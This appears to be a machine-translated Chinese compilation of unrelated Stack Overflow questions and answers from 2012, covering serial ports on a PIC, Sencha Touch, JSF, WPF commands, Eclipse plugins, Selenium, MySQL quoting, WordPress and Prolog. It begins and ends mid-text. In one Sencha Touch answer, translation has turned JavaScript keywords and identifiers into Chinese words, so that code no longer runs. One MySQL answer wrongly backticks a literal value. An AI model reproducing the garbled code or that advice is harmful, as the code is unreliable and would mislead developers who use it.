我倾向于将文件传输、远程 make 调用和其他任何必要的内容放入某个脚本中（[无论如何，一键构建很重要](http://www.joelonsoftware.com/articles/fog0000000043.html)），然后在我的编辑器中将其设置为构建命令。我碰巧使用了[Sublime Text 2](http://www.sublimetext.com/)，它可以很好地处理我通过 make 构建 C++ 代码得到的错误消息；就个人而言，我不认为不支持这种工作流程的编辑器值得使用。有很多编辑都这样做。

哦，我会尝试用 rsync over ssh 替换 ftp。它可能更快，更容易自动化，也更安全。

# c# - C#串口+CCS C串口+PIC 16F877A

> ID：10338637
> 
> 赞同：1
> 
> 时间：2012-04-26T17:45:07.283
> 
> 标签：c#, c, serial-port, pic

我有一个连接到串行端口的 PIC 16F887A。我希望它在收到 0x01 时点亮绿色 LED，并在收到来自 pc 的 0x00 时点亮红色 LED。我从 C# windows 窗体应用程序发送字符，PIC 本身是用 CCS C 编程的。你能告诉我我做错了什么，因为下面的代码不起作用吗？

编辑：不起作用我的意思是它在两种情况下都会点亮红色 LED。

C# 代码

```
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.IO.Ports;

namespace deneme
{
    public partial class Form1 : Form
    {
        SerialPort port = new SerialPort("COM2", 9600, Parity.None, 8, StopBits.One);
        public Form1()
        {
            InitializeComponent();
        }

        private void openportbtn_Click(object sender, EventArgs e)
        {
            if (port.IsOpen)
            {
                port.Close();
            }

            if (!port.IsOpen)
            {
                port.Open();
            }
        }

        private void rightbtn_Click(object sender, EventArgs e)
        {
            byte[] right = new byte[1];
            right[0] = 0x01;
            port.Write(right, 0, right.Length);
        }

        private void wrongbtn_Click(object sender, EventArgs e)
        {
            byte[] wrong = new byte[1];
            wrong[0] = 0x00;
            port.Write(wrong, 0, wrong.Length);
        }
    }
} 
```

CCS C 代码

```
#include <16f877A.h>

#fuses XT,NOWDT,NOPROTECT,NOBROWNOUT,NOLVP,NOPUT,NOWRT,NODEBUG,NOCPD

#use delay (clock=4000000)

#use rs232 (baud=9600, xmit=pin_c6, rcv=pin_c7, parity=N, stop=1, bits=8)

char received;
char right = 0x01;

#int_rda
void serial_interrupt()
{
   disable_interrupts(int_rda);
   received = getc();
   if(received == right)
   {
      output_high(pin_c5); //green led
      delay_ms(200);
      output_low(pin_c5);
   }
   else
   {
      output_high(pin_c4); //red led
      delay_ms(200);
      output_low(pin_c4);
   }
}

void main()
{
   setup_psp(PSP_DISABLED);
   setup_timer_1(T1_DISABLED);
   setup_timer_2(T2_DISABLED,0,1);
   setup_adc_ports(NO_ANALOGS);
   setup_adc(ADC_OFF);
   setup_CCP1(CCP_OFF);
   setup_CCP2(CCP_OFF);

   output_low(pin_c4);
   output_low(pin_c5);

   enable_interrupts(GLOBAL);
   while(1)
   {
      enable_interrupts(int_rda);
   }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-03T04:18:03.433

如果它在两种情况下都收到 0x00，则很可能是波特率不匹配，即使是轻微的不匹配。在检测到一个起始位后，PIC 可能会看到前 7 个零并认为它看到了 8 个，在这两种情况下都是 0x00。我会尝试从 PIC 和 PC 传输并观察示波器上的线路以确保它们以相同的速度运行。您也可以尝试连续发送 0xAA 以获得眼图 (10101010) 并比较两个信号。

# javascript - 是否可以将 Ext.Component 声明为全局变量？

> ID：10338638
> 
> 赞同：0
> 
> 时间：2012-04-26T17:45:15.187
> 
> 标签：javascript, sencha-touch-2

在优化我的 Sencha Touch 2 应用程序时，我多次遇到这个问题。

很明显，我应该保持 DOM 的轻量级，我的应用程序在上面包含一个`Ext.TabBar`和一个 main `Ext.Container`。每次从一个视图切换到另一个视图时，我只需删除当前视图并将新视图添加到该容器。

但问题是，有些视图有**自定义数据**。我的意思是它们具有内部数据，例如 html 内容、过滤的存储记录等。当我将它们从主容器中删除时，我想以某种方式将它们的“状态”保存到全局变量中，例如：我正在做一个 e-带有详细信息的产品的商务应用程序。从主容器中删除详细信息面板时，我想做这样的事情：

```
var saved_detail_panel = mainContainer.getActiveItem(); 
```

如果我能做到这一点，稍后当我想将该详细信息面板添加回主容器时，我可以简单地使用：

```
mainContainer.add(saved_detail_panel); 
```

我已经尝试了很多次，但还没有找到一个有效的。

非常感谢任何帮助。谢谢你。

**更新**：当我将此代码放在控制器中的事件处理程序中时：

```
var temp = Ext.create('taxi.view.location.LocationPanel', {showAnimation: null});
taxi.main_container = temp; 
```

它运行良好，但性能不佳。我想做的事情是只在我的**app.js**中创建一次，如下所示：

```
launch: function(){
var temp = Ext.create('taxi.view.location.LocationPanel', {showAnimation: null});
}; 
```

并且只在控制器中使用它：

```
taxi.main_container = temp; 
```

它是第一次工作。但在第二次，它显示了这个错误：

```
Uncaught TypeError: Cannot call method 'replaceCls' of null 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T20:25:40.897

你可以使用应用程序的“全局命名空间”吗？那么您可以在应用程序的任何位置引用 MyApp.savedValue 吗？

```
分机应用程序（{
    名称：'我的应用程序'，

// 浏览量：[],
// 楷模： []，
// 存储：[],
    控制器：['Main']，

    启动：函数（）{
        MyApp.savedValue = "你好词";
        Ext.Viewport.add(Ext.create('Sencha.view.tablet.MainView'));
    }
});

```

Sencha 示例中的另一个想法是在 KitchenSink 演示中。在[app/controllers/Main.js](http://dev.sencha.com/deploy/touch/examples/production/kitchensink/app/controller/Main.js)中，它们使用视图缓存，该缓存在 config:{} 中设置并通过 getter/setter 访问。我认为主控制器始终存在，因此您的缓存始终可用。实际上，如果将它们加载到 app.js 中，您的所有控制器不是都保持不变吗？

```
控制器：['Main'，'FooController'，'BarController']，

```

片段来自：[app/controllers/Main.js](http://dev.sencha.com/deploy/touch/examples/production/kitchensink/app/controller/Main.js)

```
配置：{
        /**
         * @私人的
         */
        viewCache: [], // 通过 getViewCache(), setViewCache() 访问

        ...
},

 创建视图：函数（名称）{
        var cache = this.getViewCache(), // 隐含的 getter
            ln = 缓存长度，
            limit = 20, // 要缓存的最大视图
            视图，我，旧视图；

       // 查看视图是否已经在缓存中并返回
        分机（缓存，功能（项目）{
            if (item.viewName === name) {
                视图=项目；
                返回;
            }
        }， 这个）;

        如果（查看）{
            返回视图；
        }

        // 如果我们已经达到缓存限制，那么删除一些东西

        如果 (ln >= 限制) {
            对于 (i = 0; i < ln; i++) {
                oldView = 缓存[i];
                if (!oldView.isPainted()) {
                    oldView.destroy();
                    cache.splice(i, 1);
                    休息;
                }
            }
        }
        // 创建视图并将其添加到缓存中
        view = Ext.create(name);
        view.viewName = 名称；
        缓存.推送（视图）；
        this.setViewCache(缓存); // 隐含的设置器

        返回视图；
    },  

```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-01T14:08:34.353

尝试这个，

```
var appNS = new Ext.application({

    name: 'app',
    //others

    launch: function () {    
        appNS.SavedValue = 'getting start..........';       
    },

    //others

}); 
```

然后你可以在控制器内部使用它

```
console.log(appNs.SavedValue); 
```

我希望它可能会有所帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-01T14:22:40.603

另一个解决方案是缓存您的视图。它实际上并不是缓存。首先向您的应用程序添加一个数组，例如 .

```
Ext.application({
name: 'app',

viewCache: [],

viewCacheCount: 0,

launch: function () {     

    this.viewCache.push("app init......."); // push your view

}
}); 
```

这可以在任何控制器内部检索，例如

```
ths.getApplication().viewCache.pop();      //pop your view 
```

我不知道如果某些视图/组件是可自动销毁的，它可能会产生一些问题。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-20T03:48:14.150

尝试`autoDestroy: false`在您的视图中添加。

```
Ext.define('JiaoJiao.view.personal.Card', {

 extend: 'Ext.NavigationView',
 xtype: 'personalContainer',

 config: {

     tab: {
         title: '个人',
         iconCls: 'user',
         action: 'personalTab'
     },

     autoDestroy: false,

     items: [
         {
             xtype:'personal',
             store: 'Personals'
         }
     ]
 }
}); 
```

# jsf - FaceletContext 为空

> ID：10338643
> 
> 赞同：2
> 
> 时间：2012-04-26T17:45:23.300
> 
> 标签：jsf, jsf-2, facelets

我有一个无法从中获取 FaceletContext 的 JSF 2.0 项目。

这是我的 web.xml 中的设置：

```
<servlet>
    <servlet-name>Faces Servlet</servlet-name>
    <servlet-class>javax.faces.webapp.FacesServlet</servlet-class>
    <load-on-startup>1</load-on-startup>
</servlet>
<context-param>
    <param-name>javax.faces.PROJECT_STAGE</param-name>
    <param-value>Development</param-value>
</context-param>

<context-param>
    <param-name>facelets.DEVELOPMENT</param-name>
    <param-value>true</param-value>
</context-param>

<context-param>
    <param-name>javax.faces.STATE_SAVING_METHOD</param-name>
    <param-value>server</param-value>
</context-param>

<context-param>
    <param-name>javax.faces.PARTIAL_STATE_SAVING</param-name>
    <param-value>false</param-value>
</context-param>

<context-param>
    <param-name>javax.faces.FULL_STATE_SAVING_VIEW_IDS</param-name>
    <param-value>/index.xhtml</param-value>
</context-param>
<context-param>
    <param-name>javax.faces.DEFAULT_SUFFIX</param-name>
    <param-value>.xhtml</param-value>
</context-param>

<context-param>
    <param-name>javax.faces.application.CONFIG_FILES</param-name>
    <param-value>/WEB-INF/faces-config.xml</param-value>
</context-param>

<servlet-mapping>
    <servlet-name>Faces Servlet</servlet-name>
    <url-pattern>/faces/*</url-pattern>
</servlet-mapping> 
```

我可以获取 FacesContext，但不能获取 FaceletContext。以下代码行是问题所在：

```
 FacesContext fctx = FacesContext.getCurrentInstance(); //works
    //FaceletContext f2ctx = (FaceletContext) fctx.getAttributes().get(FaceletContext.FACELET_CONTEXT_KEY);
    FaceletContext f2ctx = (FaceletContext) fctx.getELContext().getContext(FaceletContext.class); 
```

有人可以帮忙吗？

更新：

以上是我总体目标的一个片段：按需加载包含对话框的 facelet 文件，然后将其添加到父级以显示。下面的代码不完整，但应该解释我的意思。请注意，该应用程序使用 Primefaces 库，因此使用 RequestContext 对象。

```
public void launch() {

    form.getChildren().clear();

    FacesContext fctx = FacesContext.getCurrentInstance();
    for (Object o: fctx.getAttributes().keySet()) {
        System.out.println(o.toString());
    }

    FaceletContext f2ctx = (FaceletContext) fctx.getAttributes().get(FaceletContext.FACELET_CONTEXT_KEY);
    //FaceletContext f2ctx = (FaceletContext) fctx.getELContext().getContext(FaceletContext.class);
    dialog = new Dialog();

    try {
        f2ctx.includeFacelet(dialog, "/WEB-INF/facelets/dialog/manager.xhtml");
        form.getChildren().add(dialog);
    } catch (IOException ex) {
        log.debug(ex.toString());
    }

    RequestContext.getCurrentInstance().update("mainPageCenterForm");
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T18:12:21.873

这将是`null`您在构建视图之前尝试访问它的时候。例如，在`beforePhase`of`RESTORE_VIEW`阶段。重新排列代码逻辑。目前尚不清楚功能要求是什么以及您尝试访问它的确切位置，因此我无法给出更合适的答案。

* * *

**与具体问题**无关**，当部分状态保存被禁用时，`javax.faces.FULL_STATE_SAVING_VIEW_IDS`上下文参数被**忽略。**也许那不是你的意图？另请参阅此相关答案[是否应该将 PARTIAL_STATE_SAVING 设置为 false？](https://stackoverflow.com/questions/10337015/should-partial-state-saving-be-set-to-false/10337452#10337452)**

# c# - 在 WPF 中，Command 的 CanExecute 方法如何获得其他 UI 元素的可见性？

> ID：10338647
> 
> 赞同：1
> 
> 时间：2012-04-26T17:45:38.727
> 
> 标签：c#, wpf, command

我已经使用 WPF 有一段时间了，但我是 Commands 的新手，但我想开始正确使用它们一次。在一个代码示例之后，我建立了一个单独的静态命令类来保存我的所有命令，它看起来像这样。

```
public static class Commands
{
    public static RoutedUICommand OpenDocument { get; set; }

    static Commands()
    {
        OpenDocument = new RoutedUICommand("Open Document", "OpenDocument", typeof(Commands));
    }

    public static void BindCommands(Window window)
    {
        window.CommandBindings.Add(new CommandBinding(OpenDocument, OpenDocument_Executed, OpenDocument_CanExecute));
    }

    private static void OpenDocument_CanExecute(object sender, CanExecuteRoutedEventArgs e)
    {
        // Should be set to true if an item is selected in the datagrid.
    }

    private static void OpenDocument_Executed(object sender, ExecutedRoutedEventArgs e)
    {

    }
} 
```

我的问题是，虽然命令将绑定到 MainWindow.xaml 中的 Button 控件，但 OpenDocument_CanExecute 方法需要查看 MainWindow.xaml 中的 DataGrid 以查看是否选择了项目。

我怎样才能把东西连接起来，以便该方法可以看到 DataGrid？

**解决方案**

受到 Ken 的回复的启发（再次感谢！），我将以下内容放在适当的位置，效果很好。

**主窗口.xaml.cs**

```
public partial class MainWindow
{
    public MainWindow()
    {
        InitializeComponent();

        Loaded += delegate
        {
            DataContext = ViewModel.Current;
            Commands.BindCommands(this);
        };
    }
} 
```

**视图模型.cs**

```
public class ViewModel
{
    private static ViewModel _current;
    public static ViewModel Current
    {
        get { return _current ?? (_current = new ViewModel()); }
        set { _current = value; }
    }

    public object SelectedItem { get; set; }
} 
```

**命令.cs**

```
public static class Commands
{
    public static RoutedUICommand OpenDocument { get; set; }

    static Commands()
    {
        OpenDocument = new RoutedUICommand("Open Document", "OpenDocument", typeof(Commands));
    }

    public static void BindCommands(Window window)
    {
        window.CommandBindings.Add(new CommandBinding(OpenDocument, OpenDocument_Executed, OpenDocument_CanExecute));
    }

    private static void OpenDocument_CanExecute(object sender, CanExecuteRoutedEventArgs e)
    {
        e.CanExecute = ViewModel.Current.SelectedItem != null;
    }

    private static void OpenDocument_Executed(object sender, ExecutedRoutedEventArgs e)
    {

    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-26T19:22:42.777

`ICommand`实现在**MVVM**模式中效果最好：

```
class ViewModel : INotifyPropertyChanged {
    class OpenDocumentCommand : ICommand {
        public bool CanExecute(object parameter) {
            return ViewModel.ItemIsSelected;
        }
        public OpenDocumentCommand(ViewModel viewModel) {
            viewModel.PropertyChanged += (s, e) => {
                if ("ItemIsSelected" == e.PropertyName) {
                    RaiseCanExecuteChanged();
                }
            };
        }
    }

    private bool _ItemIsSelected;

    public bool ItemIsSelected {
        get { return _ItemIsSelected; }
        set {
            if (value == _ItemIsSelected) return;
            _ItemIsSelected = value;
            RaisePropertyChanged("ItemIsSelected");
        }
    }

    public ICommand OpenDocument { 
        get { return new OpenDocumentCommand(this); } 
    }
} 
```

显然，我遗漏了一大堆东西。但这种模式在过去对我来说效果很好。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-26T17:51:00.900

如果您将命令与 UI 实现紧密耦合，为什么还要实现它呢？只需响应 datagrid.SelectionChanged 并编写应该发生的代码。

否则，将其放在 ViewModel 中。让 ViewModel 监控它的状态并评估 CanExe 何时为真。

**编辑**

另一方面，您可以将参数传递给您的命令，以及 Exe() 和 CanExe() 方法

```
//where T is the type you want to operate on
public static RoutedUICommand<T> OpenDocument { get; set; } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-26T19:21:58.993

如果您正在执行 MVVM 解决方案，这将是实现发布/订阅聚合器的最佳时机，该聚合器允许控件相互“对话”。它背后的要点是数据网格将发布一个事件“打开文档”。后续控件可以订阅该事件并对“打开文档”的调用做出反应。发布/订阅模式防止数据网格和控件紧密耦合。对事件聚合器进行一些搜索，我想你会在路上。

# eclipse - 无效的激活器

> ID：10338659
> 
> 赞同：0
> 
> 时间：2012-04-26T17:46:06.983
> 
> 标签：eclipse, plugins, rcp, activator

我知道关于这个主题还有其他问题，但我都试过了，但对我没有用。我想从我的 rcp 插件中将一些输出写入 excel 文件，但它显示：

```
 java.lang.NoClassDefFoundError: org/apache/poi/hssf/usermodel/HSSFWorkbook 
```

所以我这样做：`plugin.xml->runtime tab-> add the poi jars in the classpath section`。

但是当我尝试运行时，它显示：

```
org.osgi.framework.BundleException: The activator spyros.getInfo.Activator for 
bundle spyros.getInfo is invalid. 
```

我的问题：

1.  我是否必须将 poi jar 放在特定文件夹中（例如 META-INF 文件夹中），然后将它们添加到类路径中？
2.  如何修复激活器错误？

我的清单.MF

```
Manifest-Version: 1.0
Bundle-ManifestVersion: 2
Bundle-Name: GetInfo
Bundle-SymbolicName: spyros.getInfo; singleton:=true
Bundle-Version: 1.0.0.qualifier
Bundle-Activator: spyros.getInfo.Activator
Require-Bundle: org.eclipse.core.runtime,
 org.eclipse.jdt.core;bundle-version="3.7.1",
 org.eclipse.core.resources;bundle-version="3.7.100",
 org.eclipse.ui,
 org.eclipse.jdt.ui;bundle-version="3.7.1"
Bundle-ActivationPolicy: lazy
Bundle-RequiredExecutionEnvironment: JavaSE-1.6
Import-Package: org.apache.commons.collections
Bundle-ClassPath: lib/poi-3.8-20120326.jar,
 lib/poi-examples-3.8-20120326.jar,
 lib/poi-excelant-3.8-20120326.jar,
 lib/poi-ooxml-3.8-20120326.jar,
 lib/poi-ooxml-schemas-3.8-20120326.jar,
 lib/poi-scratchpad-3.8-20120326.jar 
```

我的构建属性

```
output.. = bin/
bin.includes = plugin.xml,\
               META-INF/,\
               icons/,\
               lib/poi-3.8-20120326.jar,\
               lib/poi-examples-3.8-20120326.jar,\
               lib/poi-excelant-3.8-20120326.jar,\
               lib/poi-ooxml-3.8-20120326.jar,\
               lib/poi-ooxml-schemas-3.8-20120326.jar,\
               lib/poi-scratchpad-3.8-20120326.jar 
```

我的插件.xml

```
<?xml version="1.0" encoding="UTF-8"?>
<?eclipse version="3.4"?>
<plugin>

   <extension
         point="org.eclipse.ui.commands">
      <command
            defaultHandler="spyros.getInfo.handlers.GetInfo"
            id="spyros.getInfo.commands.GetInfo"
            name="GetInfo">
      </command>
   </extension>
   <extension
         point="org.eclipse.ui.menus">
      <menuContribution
            allPopups="false"
            locationURI="menu:org.eclipse.ui.main.menu">
         <menu
               id="spyros.getInfo.commands.GetInfo"
               label="My Info">
            <command
                  commandId="spyros.getInfo.commands.GetInfo"
                  label="Get Info"
                  style="push"
                  tooltip="Get Info from methods">
            </command>
         </menu>
      </menuContribution>
   </extension>

</plugin> 
```

我很困惑，但我相信 stackoverflow 社区会有所帮助，因为你是最棒的！提前谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-03-21T07:09:57.060

这是因为：

> 有一个 ClassNotFoundException 试图首先加载该类，甚至在它到达 start() 方法之前。

所以为了解决这个问题：

1.  您必须添加`.`到您的类路径中，请参见下图。

    ![在此处输入图像描述](../Images/1f20c7c774e6ef5aa0709084b579cf69.png)

2.  `.`在您的构建和`bin.includes`. 见下图：

    ![在此处输入图像描述](../Images/d6a65845f4b03318297e73f7ffe228b9.png)

# ruby - 单击所有链接并使用 Selenium Ruby 在新选项卡中打开所有单击的链接

> ID：10338660
> 
> 赞同：1
> 
> 时间：2012-04-26T17:46:13.693
> 
> 标签：ruby, selenium, hyperlink, click, anchor

我想从我使用加载的页面打开新浏览器选项卡中的所有点击链接`driver.get "http://www.example.com"`。我在之前问过的其他问题中得到了答案，但它没有按我预期的那样工作。代码如下：

```
require 'rubygems'
require 'selenium-webdriver'

driver = Selenium::WebDriver.for :firefox
driver.get " http://www.testfire.net "

driver.find_elements(:tag_name, "a").each {|link| link.click } 
```

运行此代码后，Selenium Web Driver 会打开 Firefox，加载请求的页面并单击它找到的第一个锚标记，然后它会因错误而崩溃。

我也试过这个`driver.find_element(:tag_name, "a").send_keys [:control,'t']`这个打开新标签但没有加载页面，空白标签。

我怎样才能在循环中安排这个，这样我就不会出错，并且第一个加载页面上的所有点击链接都将在单独的浏览器选项卡中打开？

我需要使用`wait`它来工作吗？

```
[remote server] resource://fxdriver/modules/web_element_cache.js:9500:in `unknown': Element not found in the cache - perhaps the page has changed since it was looked up (Selenium::WebDriver::Error::StaleElementReferenceError)
        from [remote server] file:///C:/Users/AKASH/AppData/Local/Temp/webdriver-profile20120427-1496-sev0j4/extensions/fxdriver@googlecode.com/components/command_processor.js:9069:in `unknown'
        from [remote server] file:///C:/Users/AKASH/AppData/Local/Temp/webdriver-profile20120427-1496-sev0j4/extensions/fxdriver@googlecode.com/components/command_processor.js:9504:in `unknown'
        from [remote server] file:///C:/Users/AKASH/AppData/Local/Temp/webdriver-profile20120427-1496-sev0j4/extensions/fxdriver@googlecode.com/components/command_processor.js:10510:in `unknown'
        from [remote server] file:///C:/Users/AKASH/AppData/Local/Temp/webdriver-profile20120427-1496-sev0j4/extensions/fxdriver@googlecode.com/components/command_processor.js:10529:in `unknown'
        from [remote server] file:///C:/Users/AKASH/AppData/Local/Temp/webdriver-profile20120427-1496-sev0j4/extensions/fxdriver@googlecode.com/components/command_processor.js:10534:in `unknown'
        from [remote server] file:///C:/Users/AKASH/AppData/Local/Temp/webdriver-profile20120427-1496-sev0j4/extensions/fxdriver@googlecode.com/components/command_processor.js:10482:in `unknown'
        from D:/Ruby193/lib/ruby/gems/1.9.1/gems/selenium-webdriver-2.20.0/lib/selenium/webdriver/remote/response.rb:52:in `assert_ok'
        from D:/Ruby193/lib/ruby/gems/1.9.1/gems/selenium-webdriver-2.20.0/lib/selenium/webdriver/remote/response.rb:15:in `initialize'
        from D:/Ruby193/lib/ruby/gems/1.9.1/gems/selenium-webdriver-2.20.0/lib/selenium/webdriver/remote/http/common.rb:59:in `new'
        from D:/Ruby193/lib/ruby/gems/1.9.1/gems/selenium-webdriver-2.20.0/lib/selenium/webdriver/remote/http/common.rb:59:in `create_response'
        from D:/Ruby193/lib/ruby/gems/1.9.1/gems/selenium-webdriver-2.20.0/lib/selenium/webdriver/remote/http/default.rb:64:in `request'
        from D:/Ruby193/lib/ruby/gems/1.9.1/gems/selenium-webdriver-2.20.0/lib/selenium/webdriver/remote/http/common.rb:40:in `call'
        from D:/Ruby193/lib/ruby/gems/1.9.1/gems/selenium-webdriver-2.20.0/lib/selenium/webdriver/remote/bridge.rb:594:in `raw_execute'
        from D:/Ruby193/lib/ruby/gems/1.9.1/gems/selenium-webdriver-2.20.0/lib/selenium/webdriver/remote/bridge.rb:572:in `execute'
        from D:/Ruby193/lib/ruby/gems/1.9.1/gems/selenium-webdriver-2.20.0/lib/selenium/webdriver/remote/bridge.rb:354:in `clickElement'
        from D:/Ruby193/lib/ruby/gems/1.9.1/gems/selenium-webdriver-2.20.0/lib/selenium/webdriver/common/element.rb:34:in `click'
        from selclick.rb:6:in `block in <main>'
        from selclick.rb:5:in `each'
        from selclick.rb:5:in `<main>' 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T16:12:03.570

爪哇

```
List<WebElement> elements = driver.find_elements( _locator_ );
for (i=0; i<elements.size(); i++) {
    List<WebElement> elements2 =driver.find_elements(_locator_) 

    WebElement ele = elements2.get(i);

    ele.click();
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-27T07:20:20.397

我确实相信这是“按预期工作”。

您的循环的第一次迭代工作正常，然后每个迭代都失败了。原因正是由错误给出的。由于页面已重新加载，对象引用不再指向正确的链接。

我不确定这是否清楚，所以让我们看看到底发生了什么。

您访问您的页面。所有链接都收集在数组中。在循环的第一次迭代中，单击第一个链接。您访问的是同一个页面的链接。您不再位于以前的页面上。循环的第二次迭代查找前一页的链接。它不再存在，因为您在下一页。因此，错误。

你到底想要完成什么？您是否尝试访问网站上的每个页面？

如果您尝试抓取该网站，我可以推荐 Mechanize 或 Anemone 吗？

# php - MySQL 查询中的表和列周围的引号真的有必要吗？

> ID：10338661
> 
> 赞同：10
> 
> 时间：2012-04-26T17:46:19.803
> 
> 标签：php, mysql

我有一个关于 mysql 查询的简短问题。

什么是正确的？

```
SELECT * FROM Persons WHERE Year='1965' 
```

或者

```
SELECT * FROM `Persons` WHERE `Year` = '1965' 
```

这是个人选择还是真的有问题？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-26T17:48:47.370

如果您的标识符（列、表名、运算符等）包含 MySQL 保留字，则需要引号。

有关保留字的完整列表，请参见此处：http: [//dev.mysql.com/doc/refman/5.5/en/reserved-words.html](http://dev.mysql.com/doc/refman/5.5/en/reserved-words.html)

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-04-26T17:48:16.173

两者都是正确的，但第二个总是会被接受，即使你使用关键字或函数`while`，`NOW()`通常会被视为运算符。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-04-26T17:52:02.640

如果您有一个名为 的表`table`或一个名为 的列，该怎么办`where`？这些是保留关键字。如果您在没有反引号的查询中使用它们，它们会产生无效的查询（当然，使用保留关键字是不好的做法）。

```
SELECT something FROM table WHERE where = 1; 
```

对比

```
SELECT something FROM `table` WHERE `where` = 1; 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-04-26T18:00:08.783

两种方法都是正确的，单引号表示字符串的开始和结束。

因此，例如，如果您使用带有空格的列别名，`Birth year`那么您将需要像这样使用单引号；

```
... WHERE `Birth year` = `1965` 
```

但是，不建议在别名中只使用一个以上的词。

正如@Cody Caughlan 在您使用[MySQL 保留字](http://dev.mysql.com/doc/refman/5.5/en/reserved-words.html)时所说的那样。

# mysql - wp_postmeta 上的 SQL 查询

> ID：10338663
> 
> 赞同：0
> 
> 时间：2012-04-26T17:46:26.207
> 
> 标签：mysql, sql, wordpress

我正在尝试找到一种方法，将一个 meta_key 的 meta_value 设置为每个 post_id 的另一个 meta_key 的 meta_value。

我有两个 meta_keys - 'url' 和 'link'。

“链接”键包含需要删除的附属链接，这些链接基本上反映了“url”键中保存的值，该键仅包含指向目标站点的标准链接。

我需要对整个 wp_postmeta 表执行此操作，我需要使每个 post_id 的 'link' 等于 'url'。我不能只全局替换它们，因为每个 post_id 都有不同且唯一的“url”值。

非常感谢任何帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T18:09:23.650

尝试（首先备份您的数据库）：

```
update wp_postmeta h, wp_postmeta p
set h.meta_value = p.meta_value
where h.meta_key = 'link' AND
      p.meta_key = 'url' AND
      p.post_id = h.post_id 
```

# prolog - Prolog powerset 谓词

> ID：10338666
> 
> 赞同：1
> 
> 时间：2012-04-26T17:46:40.667
> 
> 标签：prolog, sicstus-prolog, powerset

我希望定义一个谓词 powerset(X, P)，当 P 是 X 的幂集时它为真。无论 P 是否接地，都应该有效。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-26T20:59:52.760

由于您使用 SICStus Prolog，您可以使用 library(lists) 中的 subseq0(+Sequence, ?SubSequence)，“当 SubSequence 是 Sequence 的子序列时为真，但可能是 Sequence 本身”（引自手册[http:// www.sics.se/sicstus/docs/4.0.2/html/sicstus/lib_002dlists.html](http://www.sics.se/sicstus/docs/4.0.2/html/sicstus/lib_002dlists.html)）。

```
 ?- setof(X, subseq0([a,b,c],X), Xs).
      Xs = [[],[a],[a,b],[a,b,c],[a,c],[b],[b,c],[c]] 
```

如果您不允许使用库谓词，则可以按照[gnu Prolog powerset modify](https://stackoverflow.com/questions/4146117/gnu-prolog-powerset-modification)中的说明实现 subseteq0 ，为了完整起见，我在此引用（感谢*gusbro*）

```
powerset([], []).
powerset([H|T], P) :- powerset(T,P).
powerset([H|T], [H|P]) :- powerset(T,P). 
```

# ios - xcode中的组件配置文件？

> ID：10338669
> 
> 赞同：0
> 
> 时间：2012-04-26T17:46:59.990
> 
> 标签：ios, xcode, cocoa-touch, frameworks, custom-component

假设我想为 iOS 开发一个 RSS Reader 可重用组件，其中包含一个可由用户更新的配置文件。所以我的愿望清单如下：

1.  单击即可将组件添加到新项目。就像添加框架一样。
2.  我还希望我的源文件对其他用户（开发人员）不可见。
3.  是的，如果有与之相关的资源也应该无缝地添加到新项目中。
4.  最重要的是，我希望开发人员能够为我的组件调整一些参数，例如为我的 RSS 阅读器指定 URL。

简而言之，在我完成后，我希望开发人员看到的是我的头文件和配置文件。有任何想法吗 ？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T18:10:47.093

[您应该使用此处](https://github.com/kstenerud/iOS-Universal-Framework)描述的假框架。

# ajax - wordpress 显示使用 ajax 检索到的帖子中的评论

> ID：10338672
> 
> 赞同：3
> 
> 时间：2012-04-26T17:47:06.637
> 
> 标签：ajax, wordpress

我正在使用 ajax 加载帖子。代码是

```
$(document).ready(function(){

    loadPostsFun = function(){
        $.ajax({
            url: "http://lab1.koalamedia.es/ajax/",
            //url: "/random/",
            success: function(response){
                $("#randomPost").html( response );
            }
        });
    };
    $("#another").click(function(){
        loadPostsFun();
        return false;
    });
}); 
```

响应由带有以下代码的自定义模板生成：

```
<?php
    query_posts('showposts=1&orderby=rand');
    the_post();
    $args = array( 'numberposts' => 1, 'orderby' => 'date' );
    $rand_posts = get_posts( $args );
?>
<?php
    foreach( $rand_posts as $post ) :  setup_postdata($post);
?>

    <div id="post-<?php the_ID(); ?>" <?php post_class(); ?>>
      <?php if ( is_front_page() ) { ?>
        <h2 class="entry-title"><?php the_title(); ?></h2>
        <?php } else { ?>
          <h1 class="entry-title"><?php the_title(); ?></h1>
        <?php } ?>

         <div class="entry-content">
          <?php the_content(); ?>
          <?php wp_link_pages( array( 'before' => '<div class="page-link">' . __( 'Pages:', 'twentyten' ), 'after' => '</div>' ) ); ?>
        <?php comments_popup_link(__('Comments (0)'), __('Comments (1)'), __('Comments (%)')); ?>
        </div><!-- .entry-content -->
      </div><!-- #post-## -->

      <?php 

        //comments_template( '', true ); //this doesn't work
        comment_form(); 
        //wp_list_comments(''); //this doesn't work

      ?>
<?php endforeach; ?> 
```

ajax 请求有效，但没有显示评论。所有帖子数据都在那里。如何显示评论？

comments_template 或 wp_list_comments 都不起作用。

您可以查看演示或下载我在[此处完成的模板示例](http://lab1.koalamedia.es/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-26T23:45:18.500

没有太多调整只`wp_list_comments()`在评论模板（通常`comments.php`）中起作用。

使用[`get_comments()`](http://codex.wordpress.org/Function_Reference/get_comments)，将帖子 ID 作为参数传递：

```
$comments = get_comments(array ( 'post_id' =>  $post->ID );
if ( $comments )
{
